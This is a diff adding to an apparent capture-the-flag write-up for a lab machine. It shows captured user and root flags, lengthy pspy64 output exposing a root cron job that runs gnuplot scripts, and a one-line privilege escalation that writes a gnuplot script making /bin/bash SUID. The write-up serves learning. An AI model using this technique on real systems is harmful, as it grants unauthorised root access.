@@ -37,6 +37,273 @@ connect via ssh to machine and get the user flag:
 
     5a8703d0c0e7d89425d48fb33e573af7
 
+inside the machine there was additional file name pspy64 and a directory name toto
+
+i runned a file pspy64 using ./pspy64 to see what procceses run backend:
+
+ 
+        2023/10/27 18:39:07 CMD: UID=1007  PID=137898 | ./pspy64 
+    2023/10/27 18:39:07 CMD: UID=0     PID=137897 | 
+    2023/10/27 18:39:07 CMD: UID=1007  PID=137799 | -bash 
+    2023/10/27 18:39:07 CMD: UID=1007  PID=137798 | sshd: vdaisley@pts/0 
+    2023/10/27 18:39:07 CMD: UID=1007  PID=137754 | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+    2023/10/27 18:39:07 CMD: UID=1007  PID=137716 | /usr/bin/pulseaudio --daemonize=no --log-target=journal                                                   
+    2023/10/27 18:39:07 CMD: UID=0     PID=137713 | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=137710 | 
+    2023/10/27 18:39:07 CMD: UID=1007  PID=137709 | (sd-pam) 
+    2023/10/27 18:39:07 CMD: UID=1007  PID=137704 | /lib/systemd/systemd --user 
+    2023/10/27 18:39:07 CMD: UID=0     PID=137685 | sshd: vdaisley [priv] 
+    2023/10/27 18:39:07 CMD: UID=0     PID=137647 | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=137118 | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=136838 | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=136501 | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=136313 | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=134581 | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=132191 | 
+    2023/10/27 18:39:07 CMD: UID=33    PID=106130 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=105650 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=105301 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=105300 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=105263 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=104993 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=104967 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=104966 | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=108   PID=57531  | /usr/sbin/uuidd --socket-activation                                                                       
+    2023/10/27 18:39:07 CMD: UID=33    PID=45063  | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=33    PID=45061  | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=113   PID=9672   | /usr/libexec/rtkit-daemon 
+    2023/10/27 18:39:07 CMD: UID=0     PID=968    | /sbin/agetty -o -p -- \u --noclear tty1 linux                                                             
+    2023/10/27 18:39:07 CMD: UID=0     PID=967    | /usr/sbin/apache2 -k start 
+    2023/10/27 18:39:07 CMD: UID=0     PID=957    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups                                                   
+    2023/10/27 18:39:07 CMD: UID=1     PID=956    | /usr/sbin/atd -f 
+    2023/10/27 18:39:07 CMD: UID=0     PID=955    | /usr/bin/python3 /usr/bin/fail2ban-server -xf start                                                       
+    2023/10/27 18:39:07 CMD: UID=0     PID=952    | /usr/sbin/cron -f 
+    2023/10/27 18:39:07 CMD: UID=101   PID=893    | /lib/systemd/systemd-resolved                                                                             
+    2023/10/27 18:39:07 CMD: UID=0     PID=781    | /usr/sbin/ModemManager 
+    2023/10/27 18:39:07 CMD: UID=117   PID=773    | avahi-daemon: chroot helper 
+    2023/10/27 18:39:07 CMD: UID=0     PID=760    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant                                                         
+    2023/10/27 18:39:07 CMD: UID=0     PID=759    | /usr/lib/udisks2/udisksd 
+    2023/10/27 18:39:07 CMD: UID=0     PID=758    | /lib/systemd/systemd-logind 
+    2023/10/27 18:39:07 CMD: UID=104   PID=755    | /usr/sbin/rsyslogd -n -iNONE 
+    2023/10/27 18:39:07 CMD: UID=0     PID=749    | /usr/lib/policykit-1/polkitd --no-debug                                                                   
+    2023/10/27 18:39:07 CMD: UID=0     PID=747    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers                                      
+    2023/10/27 18:39:07 CMD: UID=0     PID=743    | /usr/sbin/irqbalance --foreground                                                                         
+    2023/10/27 18:39:07 CMD: UID=0     PID=736    | /usr/sbin/NetworkManager --no-daemon                                                                      
+    2023/10/27 18:39:07 CMD: UID=103   PID=731    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only  
+    2023/10/27 18:39:07 CMD: UID=117   PID=729    | avahi-daemon: running [topology.local]                                                                    
+    2023/10/27 18:39:07 CMD: UID=0     PID=728    | /usr/lib/accountsservice/accounts-daemon                                                                  
+    2023/10/27 18:39:07 CMD: UID=0     PID=693    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=670    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0                                           
+    2023/10/27 18:39:07 CMD: UID=0     PID=663    | /usr/bin/vmtoolsd 
+    2023/10/27 18:39:07 CMD: UID=0     PID=657    | /usr/bin/VGAuthService 
+    2023/10/27 18:39:07 CMD: UID=102   PID=632    | /lib/systemd/systemd-timesyncd                                                                            
+    2023/10/27 18:39:07 CMD: UID=0     PID=624    | /sbin/auditd 
+    2023/10/27 18:39:07 CMD: UID=0     PID=595    | /sbin/multipathd -d -s 
+    2023/10/27 18:39:07 CMD: UID=0     PID=594    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=593    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=592    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=591    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=495    | /lib/systemd/systemd-udevd 
+    2023/10/27 18:39:07 CMD: UID=0     PID=467    | /lib/systemd/systemd-journald                                                                             
+    2023/10/27 18:39:07 CMD: UID=0     PID=445    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=412    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=411    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=360    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=332    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=331    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=330    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=301    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=300    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=299    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=298    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=297    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=296    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=295    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=294    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=293    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=292    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=291    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=290    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=289    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=288    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=287    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=286    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=285    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=284    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=283    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=282    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=281    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=280    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=279    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=278    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=277    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=276    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=275    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=274    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=273    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=272    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=271    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=270    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=269    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=268    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=267    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=266    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=265    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=264    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=263    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=262    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=261    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=260    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=259    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=258    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=257    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=256    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=255    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=254    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=253    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=251    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=250    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=248    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=247    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=246    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=243    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=241    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=240    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=235    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=219    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=209    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=208    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=207    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=206    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=205    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=204    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=157    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=144    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=141    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=132    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=130    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=128    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=127    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=126    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=125    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=124    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=123    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=122    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=121    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=120    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=119    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=118    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=117    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=116    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=115    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=114    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=113    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=112    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=111    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=110    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=109    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=108    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=107    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=106    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=105    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=104    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=103    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=102    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=101    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=100    | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=99     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=98     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=97     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=96     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=95     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=94     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=93     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=92     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=91     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=89     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=88     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=85     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=84     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=83     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=82     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=81     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=80     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=79     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=78     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=77     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=30     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=29     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=28     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=27     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=26     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=25     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=24     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=23     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=22     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=21     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=20     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=18     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=17     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=16     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=15     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=14     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=12     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=11     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=10     | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=9      | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=8      | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=6      | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=4      | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=3      | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=2      | 
+    2023/10/27 18:39:07 CMD: UID=0     PID=1      | /sbin/init 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137911 | /usr/sbin/CRON -f 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137910 | /usr/sbin/CRON -f 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137909 | /usr/sbin/CRON -f 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137908 | /usr/sbin/CRON -f 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137907 | /usr/sbin/CRON -f 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137917 | cut -d   -f3,7 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137916 | tr -s   
+    2023/10/27 18:40:01 CMD: UID=0     PID=137915 | grep enp 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137914 | netstat -i 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137912 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:40:01 CMD: UID=0     PID=137918 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:40:01 CMD: UID=0     PID=137921 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:40:01 CMD: UID=0     PID=137920 | cut -d  -f 3 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137919 | grep -o load average:.*$ 
+    2023/10/27 18:40:01 CMD: UID=0     PID=137922 | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;                                          
+    2023/10/27 18:40:01 CMD: UID=0     PID=137923 | find /opt/gnuplot -name *.plt -exec gnuplot {} ;                                                          
+    2023/10/27 18:40:01 CMD: UID=0     PID=137925 | gnuplot /opt/gnuplot/loadplot.plt                                                                         
+    2023/10/27 18:40:01 CMD: UID=0     PID=137924 | tail -60 /opt/gnuplot/netdata.dat                                                                         
+    2023/10/27 18:40:01 CMD: UID=0     PID=137926 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:40:01 CMD: UID=0     PID=137927 | gnuplot /opt/gnuplot/networkplot.plt                                                                      
+    2023/10/27 18:41:01 CMD: UID=0     PID=137931 | /usr/sbin/CRON -f 
+    2023/10/27 18:41:01 CMD: UID=0     PID=137930 | /usr/sbin/CRON -f 
+    2023/10/27 18:41:01 CMD: UID=0     PID=137932 | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;                                          
+    2023/10/27 18:41:01 CMD: UID=0     PID=137934 | 
+    2023/10/27 18:41:01 CMD: UID=0     PID=137933 | find /opt/gnuplot -name *.plt -exec gnuplot {} ;                                                          
+    2023/10/27 18:41:01 CMD: UID=0     PID=137940 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:41:01 CMD: UID=0     PID=137939 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:41:01 CMD: UID=0     PID=137938 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:41:01 CMD: UID=0     PID=137937 | netstat -i 
+    2023/10/27 18:41:01 CMD: UID=0     PID=137936 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:41:01 CMD: UID=0     PID=137935 | gnuplot /opt/gnuplot/loadplot.plt                                                                         
+    2023/10/27 18:41:01 CMD: UID=0     PID=137944 | sed s/,//g 
+    2023/10/27 18:41:01 CMD: UID=0     PID=137943 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:41:01 CMD: UID=0     PID=137942 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:41:01 CMD: UID=0     PID=137941 | /bin/sh /opt/gnuplot/getdata.sh                                                                           
+    2023/10/27 18:41:01 CMD: UID=0     PID=137947 | gnuplot /opt/gnuplot/networkplot.plt
+
+
+i found out that programm name Gnuplot could be used to escalate privilages by using:
+    echo 'system "chmod u+s /bin/bash/"' > /opt/gnuplot/root.plt
+
+this command turns /bin/bash binary to be access to all users inside the machine and using bash -p command i get a root privilages and got a root flag:
+
+174ca8a8385d8a409347b6a9f386d710
+
+
+
 
 
 
